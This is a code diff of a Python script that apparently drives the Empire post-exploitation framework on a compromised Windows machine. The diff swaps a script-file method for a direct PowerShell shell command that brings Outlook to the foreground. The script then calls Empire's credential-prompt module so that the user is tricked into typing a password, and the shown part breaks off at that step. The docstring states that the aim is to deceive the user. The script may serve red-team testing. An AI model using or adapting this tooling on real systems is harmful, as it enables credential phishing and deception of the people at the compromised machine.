@@ -1,5 +1,5 @@
 """
-Brings Outlook foreground & prompts for credentials to deceive user
+Brings Outlook foreground & prompts for credentials to deceive user.
 """
 from EmpireAPIWrapper import empireAPI
 from empire_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
@@ -14,37 +14,20 @@ def run(API, agent_name):
     """
 
     # Step 1 - Bring outlook foreground
-    script_path = "/tmp/showoutlook.ps1"
-    show_outlook_PSH_script = """Function ShowOutlook { 
-        Add-Type @"
-        using System;
-        using System.Runtime.InteropServices;
-        public class SFW {
-
-            [DllImport("user32.dll")]
-            public static extern int ShowWindow(int hwnd, int nCmdShow);
-
-        }
-"@  #DO NOT add tab to this line
-
+    show_outlook_psh = """
+        $sig = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+        Add-Type -MemberDefinition $sig -name NativeMethods -namespace Win32
         $h =  (get-process OUTLOOK).MainWindowHandle
         if($h) { # bring foreground
-            [SFW]::ShowWindow($h, 3)
+            [Win32.NativeMethods]::ShowWindowAsync($h, 3)
         }
         else { # start a new process
             start Outlook
         }
-    }"""
-    with open(script_path, "w") as text_file:
-        text_file.write(show_outlook_PSH_script)
+    """
+    opts = {'Agent': agent_name, 'command': show_outlook_psh}    
+    API.agent_run_shell_cmd_with_result(agent_name, opts)
     
-    options = management.invoke_script.options
-    params = {
-                options.required_agent: agent_name,
-                options.scriptpath: script_path,
-                options.required_scriptcmd: 'ShowOutlook'
-    }
-    API.module_exec(management.invoke_script.path, params)
     # Step 2 - Prompt for Credentials
     options = collection.prompt.options
     params = {
